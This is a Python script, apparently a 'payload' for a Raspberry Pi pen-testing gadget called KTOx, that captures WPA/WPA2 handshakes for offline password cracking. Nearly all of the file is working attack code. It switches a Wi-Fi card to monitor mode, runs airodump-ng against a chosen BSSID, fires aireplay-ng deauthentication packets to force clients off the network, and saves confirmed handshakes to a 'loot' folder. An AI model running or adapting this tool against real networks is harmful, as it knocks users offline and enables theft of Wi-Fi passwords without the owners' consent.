#!/usr/bin/env python3
import json
"""
KTOx *payload* – **WiFi Handshake Capture**
==============================================
This payload automates the process of capturing WPA/WPA2 4-way handshakes,
which can later be used for offline password cracking. It uses `airodump-ng`
to listen for handshakes and `aireplay-ng` to send deauthentication packets
to force clients to reconnect, thus generating a handshake.

Features:
- Interactive UI for selecting the wireless interface.
- Activates monitor mode on the selected interface.
- Allows configuration of target BSSID, channel, and ESSID.
- Optionally sends deauthentication packets to speed up handshake capture.
- Saves captured handshakes to the `loot/Handshakes` directory.
- Displays status messages on the LCD.
- Graceful exit via KEY3 or Ctrl-C, deactivating monitor mode.

Controls:
- INTERFACE SELECTION SCREEN:
    - UP/DOWN: Navigate available wireless interfaces.
    - OK: Select interface and activate monitor mode.
    - KEY3: Cancel selection and exit.
- CONFIGURATION SCREEN:
    - UP/DOWN: Navigate configuration parameters (BSSID, Channel, ESSID).
    - OK: Edit selected parameter.
    - KEY1: Toggle deauth attack.
    - KEY2: Start capture.
    - KEY3: Exit Payload.
- BSSID/ESSID INPUT SCREEN:
    - UP/DOWN: Change character at cursor position.
    - LEFT/RIGHT: Move cursor.
    - OK: Confirm input.
    - KEY3: Cancel input.
- CHANNEL INPUT SCREEN:
    - UP/DOWN: Increment/decrement channel.
    - OK: Confirm channel.
    - KEY3: Cancel input.
"""
import sys
import os
import time
import signal
import subprocess
import threading # Added threading import as it was missing

# ----------------------------
# KTOx PATH and ROOT check
# ----------------------------
def is_root():
    return os.geteuid() == 0

# Prefer installed KTOx path; fallback to repo-relative
PREFERRED_KTOX = '/root/KTOx'
if os.path.isdir(PREFERRED_KTOX):
    if PREFERRED_KTOX not in sys.path:
        sys.path.insert(0, PREFERRED_KTOX)
else:
    KTOX_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..'))
    if os.path.isdir(KTOX_PATH) and KTOX_PATH not in sys.path:
        sys.path.insert(0, KTOX_PATH)

# ----------------------------
# Third-party library imports 
# ----------------------------
try:
    import RPi.GPIO as GPIO
    import LCD_Config
    import LCD_1in44
    from PIL import Image, ImageDraw, ImageFont
except ImportError:
    print("ERROR: Hardware libraries (RPi.GPIO, LCD, PIL) not found.", file=sys.stderr)
    print("Please run 'sudo pip3 install RPi.GPIO spidev Pillow'.", file=sys.stderr)
    sys.exit(1)

# ----------------------------
# KTOx WiFi Integration
# ----------------------------
try:
    from wifi.ktox_integration import get_available_interfaces
    import monitor_mode_helper
    WIFI_INTEGRATION_AVAILABLE = True
except ImportError:
    WIFI_INTEGRATION_AVAILABLE = False
    def get_available_interfaces():
        return []
    def activate_monitor_mode(interface):
        return None
    def deactivate_monitor_mode(interface):
        return False

WIFI_INTERFACE = None
ORIGINAL_WIFI_INTERFACE = None
TARGET_BSSID = "00:11:22:33:44:55"
TARGET_CHANNEL = "6"
TARGET_ESSID = "MyHomeWiFi"
SEND_DEAUTH = True
KTOX_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..'))
LOOT_DIR = os.path.join(KTOX_DIR, "loot", "Handshakes")

# Load PINS from KTOx gui_conf.json
PINS = {"UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16}
try:
    import json
    def _find_gui_conf():
        candidates = [
            os.path.join(os.getcwd(), 'gui_conf.json'),
            os.path.join('/root/KTOx', 'gui_conf.json'),
            os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'KTOx', 'gui_conf.json'),
        ]
        for sp in sys.path:
            try:
                if sp and os.path.basename(sp) == 'KTOx':
                    candidates.append(os.path.join(sp, 'gui_conf.json'))
            except Exception:
                pass
        for p in candidates:
            if os.path.exists(p):
                return p
        return None
    conf_path = _find_gui_conf()
    if conf_path:
        with open(conf_path, 'r') as f:
            data = json.load(f)
        conf_pins = data.get("PINS", {})
        PINS = {
            "UP": conf_pins.get("KEY_UP_PIN", PINS["UP"]),
            "DOWN": conf_pins.get("KEY_DOWN_PIN", PINS["DOWN"]),
            "LEFT": conf_pins.get("KEY_LEFT_PIN", PINS["LEFT"]),
            "RIGHT": conf_pins.get("KEY_RIGHT_PIN", PINS["RIGHT"]),
            "OK": conf_pins.get("KEY_PRESS_PIN", PINS["OK"]),
            "KEY1": conf_pins.get("KEY1_PIN", PINS["KEY1"]),
            "KEY2": conf_pins.get("KEY2_PIN", PINS["KEY2"]),
            "KEY3": conf_pins.get("KEY3_PIN", PINS["KEY3"]),
        }
except Exception:
    pass
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT = ImageFont.load_default()

running = True
attack_thread = None  # UI thread wrapper
ATTACK_PROC = None     # subprocess running airodump
status_msg = "Press OK to start"
# wifi_manager = WiFiManager() # No longer needed for monitor mode

# --- Local Monitor Mode Functions ---
# These functions will be removed and replaced by monitor_mode_helper
# def _run_command(...): ...
# def _interface_exists(...): ...
# def _is_in_monitor_mode(...): ...
# def _activate_monitor_mode(...): ...
# def _deactivate_monitor_mode(...): ...

def cleanup(*_):
    global running, WIFI_INTERFACE, ORIGINAL_WIFI_INTERFACE, ATTACK_PROC
    running = False
    try:
        if ATTACK_PROC and ATTACK_PROC.poll() is None:
            ATTACK_PROC.terminate()
    except Exception:
        pass
    
    if WIFI_INTERFACE: # Check if monitor mode was ever activated
        print(f"Attempting to deactivate monitor mode on {WIFI_INTERFACE}...", file=sys.stderr)
        success = monitor_mode_helper.deactivate_monitor_mode(WIFI_INTERFACE)
        if success:
            print(f"Successfully deactivated monitor mode on {WIFI_INTERFACE}", file=sys.stderr)
        else:
            print(f"ERROR: Failed to deactivate monitor mode on {WIFI_INTERFACE}", file=sys.stderr)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def draw_message(lines, color="yellow"):
    img = Image.new("RGB", (WIDTH, HEIGHT), (10, 0, 0))
    d = ImageDraw.Draw(img)
    y = 40
    for line in lines:
        bbox = d.textbbox((0, 0), line, font=FONT_TITLE)
        w = bbox[2] - bbox[0]
        x = (WIDTH - w) // 2
        d.text((x, y), line, font=FONT_TITLE, fill=color)
        y += 15
    LCD.LCD_ShowImage(img, 0, 0)

def draw_ui_main(params, selected_index):
    img = Image.new("RGB", (WIDTH, HEIGHT), (10, 0, 0))
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Handshake Capture", font=FONT_TITLE, fill="#FFC300")
    d.line([(0, 22), (128, 22)], fill="#FFC300", width=1)

    y_pos = 25
    param_keys = list(params.keys())
    for i, key in enumerate(param_keys):
        color = "yellow" if i == selected_index else "white"
        d.text((5, y_pos), f"{key}: {params[key]}", font=FONT, fill=color)
        y_pos += 11
    
    d.text((5, 100), f"Deauth: {'ON' if SEND_DEAUTH else 'OFF'}", font=FONT, fill=(242, 243, 244))
    d.text((5, 115), "OK=Edit | KEY1=Deauth | KEY2=Start | KEY3=Exit", font=FONT, fill=(171, 178, 185))
    LCD.LCD_ShowImage(img, 0, 0)

def draw_ui_interface_selection(interfaces, current_selection):
    img = Image.new("RGB", (WIDTH, HEIGHT), (10, 0, 0))
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Select Interface", font=FONT_TITLE, fill=(171, 178, 185))
    d.line([(0, 22), (128, 22)], fill=(171, 178, 185), width=1)

    y_pos = 25
    for i, iface in enumerate(interfaces):
        color = "yellow" if i == current_selection else "white"
        d.text((5, y_pos), iface, font=FONT, fill=color)
        y_pos += 11
    
    d.text((5, 115), "UP/DOWN=Select | OK=Confirm", font=FONT, fill=(171, 178, 185))
    LCD.LCD_ShowImage(img, 0, 0)

def select_interface_menu():
    global WIFI_INTERFACE, ORIGINAL_WIFI_INTERFACE, status_msg
    
    available_interfaces = [iface for iface in get_available_interfaces() if iface.startswith('wlan')]
    # Prefer wlan1 if present
    if 'wlan1' in available_interfaces:
        available_interfaces.remove('wlan1')
        available_interfaces.insert(0, 'wlan1')
    if not available_interfaces:
        draw_message(["No WiFi interfaces found!"], "red")
        time.sleep(3)
        return False

    current_menu_selection = 0
    last_button_press_time = 0
    BUTTON_DEBOUNCE_TIME = 0.2 # seconds

    while running:
        current_time = time.time()
        draw_ui_interface_selection(available_interfaces, current_menu_selection)
        
        if GPIO.input(PINS["UP"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
            last_button_press_time = current_time
            current_menu_selection = (current_menu_selection - 1 + len(available_interfaces)) % len(available_interfaces)
            time.sleep(BUTTON_DEBOUNCE_TIME)
        elif GPIO.input(PINS["DOWN"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
            last_button_press_time = current_time
            current_menu_selection = (current_menu_selection + 1) % len(available_interfaces)
            time.sleep(BUTTON_DEBOUNCE_TIME)
        elif GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
            last_button_press_time = current_time
            selected_iface = available_interfaces[current_menu_selection]
            draw_message([f"Activating monitor", f"mode on {selected_iface}..."], "yellow")
            print(f"Attempting to activate monitor mode on {selected_iface}...", file=sys.stderr)
            
            ORIGINAL_WIFI_INTERFACE = selected_iface # Store original interface before activation
            monitor_iface = monitor_mode_helper.activate_monitor_mode(selected_iface)
            if monitor_iface:
                WIFI_INTERFACE = monitor_iface
                draw_message([f"Monitor mode active", f"on {WIFI_INTERFACE}"], "lime")
                print(f"Successfully activated monitor mode on {WIFI_INTERFACE}", file=sys.stderr)
                time.sleep(2)
                return True
            else:
                draw_message(["ERROR:", "Monitor mode failed!", "Check stderr for details."], "red")
                print(f"ERROR: monitor_mode_helper.activate_monitor_mode failed for {selected_iface}. See stderr for details from helper.", file=sys.stderr)
                time.sleep(3)
                return False
        elif GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
            last_button_press_time = current_time
            return False
        
        time.sleep(0.05)

def handle_text_input_logic(initial_text, prompt, char_set):
    global current_bssid_input, bssid_input_cursor_pos, current_essid_input, essid_input_cursor_pos
    
    if prompt == "BSSID":
        current_input_ref = initial_text
        cursor_pos_ref = len(initial_text) - 1
    else: # ESSID
        current_input_ref = initial_text
        cursor_pos_ref = len(initial_text) - 1

    
    while running:
        img = Image.new("RGB", (WIDTH, HEIGHT), (10, 0, 0))
        d = ImageDraw.Draw(img)
        d.text((5, 5), f"Enter {prompt}:", font=FONT_TITLE, fill=(171, 178, 185))
        d.line([(0, 22), (128, 22)], fill=(171, 178, 185), width=1)

        display_text = list(current_input_ref)
        if cursor_pos_ref < len(display_text):
            display_text[cursor_pos_ref] = '_'
        d.text((5, 40), "".join(display_text[:16]), font=FONT_TITLE, fill=(212, 172, 13))
        d.text((5, 115), "UP/DOWN=Char | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill=(171, 178, 185))
        LCD.LCD_ShowImage(img, 0, 0)

        last_button_press_time = 0
        BUTTON_DEBOUNCE_TIME = 0.2 # seconds
        current_time = time.time()

        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                btn = name
                last_button_press_time = current_time
                break
        
        if btn == "KEY3":
            return None
        
        if btn == "OK":
            if current_input_ref:
                return current_input_ref
            else:
                draw_message(["Input cannot", "be empty!"], "red")
                time.sleep(2)
                current_input_ref = initial_text
                cursor_pos_ref = len(initial_text) - 1
        
        if btn == "LEFT":
            cursor_pos_ref = max(0, cursor_pos_ref - 1)
        elif btn == "RIGHT":
            cursor_pos_ref = min(len(current_input_ref), cursor_pos_ref + 1)
        elif btn == "UP" or btn == "DOWN":
            if cursor_pos_ref < len(current_input_ref):
                char_list = list(current_input_ref)
                current_char = char_list[cursor_pos_ref]
                
                try:
                    char_set = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+"
                    char_index = char_set.index(current_char)
                    if btn == "UP":
                        char_index = (char_index + 1) % len(char_set)
                    else:
                        char_index = (char_index - 1 + len(char_set)) % len(char_set)
                    char_list[cursor_pos_ref] = char_set[char_index]
                    current_input_ref = "".join(char_list)
                except ValueError:
                    char_list[cursor_pos_ref] = char_set[0]
                    current_input_ref = "".join(char_list)
        
        time.sleep(0.05)
    return None

def get_user_number(prompt, initial_value, min_val=1, max_val=165):
    value = initial_value
    last_button_press_time = 0
    BUTTON_DEBOUNCE_TIME = 0.2 # seconds

    while running:
        current_time = time.time()
        draw_message([f"{prompt}:", f"{value}", "UP/DOWN | OK=Save"])
        
        if GPIO.input(PINS["UP"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
            last_button_press_time = current_time
            value = min(max_val, value + 1)
            time.sleep(BUTTON_DEBOUNCE_TIME)
        elif GPIO.input(PINS["DOWN"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
            last_button_press_time = current_time
            value = max(1, value - 1)
            time.sleep(BUTTON_DEBOUNCE_TIME)
        elif GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
            last_button_press_time = current_time
            return value
        elif GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
            last_button_press_time = current_time
            return initial_value
        time.sleep(0.05)

def run_attack():
    global status_msg
    
    os.makedirs(LOOT_DIR, exist_ok=True)
    timestamp = time.strftime("%Y-%m-%d_%H%M%S")
    output_prefix = os.path.join(LOOT_DIR, f"handshake_{TARGET_ESSID.replace(' ', '_')}_{timestamp}")
    
    status_msg = "Listening..."
    
    try:
        command = f"airodump-ng --bssid {TARGET_BSSID} -c {TARGET_CHANNEL} -w {output_prefix} {WIFI_INTERFACE}"
        
        global ATTACK_PROC
        ATTACK_PROC = subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        deauth_proc = None
        if SEND_DEAUTH:
            deauth_cmd = f"aireplay-ng -0 5 -a {TARGET_BSSID} {WIFI_INTERFACE}"
            deauth_proc = subprocess.Popen(deauth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        cap_file = f"{output_prefix}-01.cap"
        start_time = time.time()
        while time.time() - start_time < 120:
            if not running: break
            status_msg = f"Listening... {int(time.time() - start_time)}s"
            if os.path.exists(cap_file):
                check_cmd = f"aircrack-ng {cap_file} | grep '1 handshake'"
                if subprocess.run(check_cmd, shell=True, capture_output=True).returncode == 0:
                    status_msg = "Handshake captured!"
                    return
            time.sleep(2)

        status_msg = "Timeout reached."

    except Exception as e:
        status_msg = "Attack failed!"
        print(f"Airodump attack failed: {e}", file=sys.stderr)
    finally:
        try:
            if ATTACK_PROC: ATTACK_PROC.terminate()
        except Exception:
            pass
        try:
            if deauth_proc: deauth_proc.terminate()
        except Exception:
            pass

def check_dependencies():
    """Check for required command-line tools."""
    for dep in ["airodump-ng", "aireplay-ng", "aircrack-ng"]:
        if subprocess.run(["which", dep], capture_output=True).returncode != 0:
            return dep
    return None

if __name__ == '__main__':
    if not is_root():
        print("ERROR: This script requires root privileges.", file=sys.stderr)
        # Attempt to display on LCD if possible
        try:
            LCD = LCD_1in44.LCD()
            LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
            img = Image.new("RGB", (128, 128), (10, 0, 0))
            d = ImageDraw.Draw(img)
            FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
            d.text((10, 40), "ERROR:\nRoot privileges\nrequired.", font=FONT_TITLE, fill="red")
            LCD.LCD_ShowImage(img, 0, 0)
        except Exception as e:
            print(f"Could not display error on LCD: {e}", file=sys.stderr)
        sys.exit(1)

    dep_missing = check_dependencies()
    if dep_missing:
        draw_message([f"ERROR:", f"{dep_missing} not found."], "red")
        time.sleep(5)
        sys.exit(1)

    if not WIFI_INTEGRATION_AVAILABLE:
        draw_message(["ERROR:", "WiFi integration not found."], "red")
        time.sleep(5)
        sys.exit(1)
        
    current_screen = "interface_select"
    selected_param_index = 0
    params = {
        "BSSID": TARGET_BSSID,
        "Channel": TARGET_CHANNEL,
        "ESSID": TARGET_ESSID
    }
    param_keys = list(params.keys())
    
    try:
        if not select_interface_menu():
            draw_message(["No interface selected", "or monitor mode failed."], "red")
            time.sleep(3)
            raise SystemExit("No interface selected or monitor mode failed.")
        
        current_screen = "main_config"
        last_button_press_time = 0
        BUTTON_DEBOUNCE_TIME = 0.3 # seconds

        while running:
            current_time = time.time()
            if current_screen == "main_config":
                draw_ui_main(params, selected_param_index)
                
                if GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    cleanup()
                    break
                
                if GPIO.input(PINS["UP"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    selected_param_index = (selected_param_index - 1) % len(param_keys)
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                elif GPIO.input(PINS["DOWN"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    selected_param_index = (selected_param_index + 1) % len(param_keys)
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                elif GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    key = param_keys[selected_param_index]
                    if key == "BSSID":
                        char_set = "0123456789abcdef:"
                        new_bssid = handle_text_input_logic(params[key], "BSSID", char_set)
                        if new_bssid:
                            params[key] = new_bssid
                            TARGET_BSSID = new_bssid
                    elif key == "ESSID":
                        char_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+"
                        new_essid = handle_text_input_logic(params[key], "ESSID", char_set)
                        if new_essid:
                            params[key] = new_essid
                            TARGET_ESSID = new_essid
                    elif key == "Channel":
                        new_channel = get_user_number("Channel", int(params[key]), 1, 165)
                        if new_channel:
                            params[key] = str(new_channel)
                            TARGET_CHANNEL = str(new_channel)
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                elif GPIO.input(PINS["KEY1"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    SEND_DEAUTH = not SEND_DEAUTH
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                elif GPIO.input(PINS["KEY2"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    attack_thread = threading.Thread(target=run_attack, daemon=True)
                    attack_thread.start()
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                    while status_msg not in ["Handshake captured!", "Timeout reached.", "Attack failed!"]:
                        if GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                            last_button_press_time = current_time
                            cleanup()
                            break
                        time.sleep(0.1)
            
            time.sleep(0.05)

    except (KeyboardInterrupt, SystemExit):
        pass
    except Exception as e:
        print(f"[ERROR] {e}", file=sys.stderr)
        try:
            with open("/tmp/wifi_handshake_capture_error.log", "w") as f:
                import traceback
                f.write(f"FATAL ERROR: {type(e).__name__}: {e}\n")
                traceback.print_exc(file=f)
        except Exception:
            pass
        draw_message([f"ERROR:", f"{str(e)[:20]}"] , "red")
        time.sleep(3)
    finally:
        cleanup()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("Handshake Capture payload finished.")
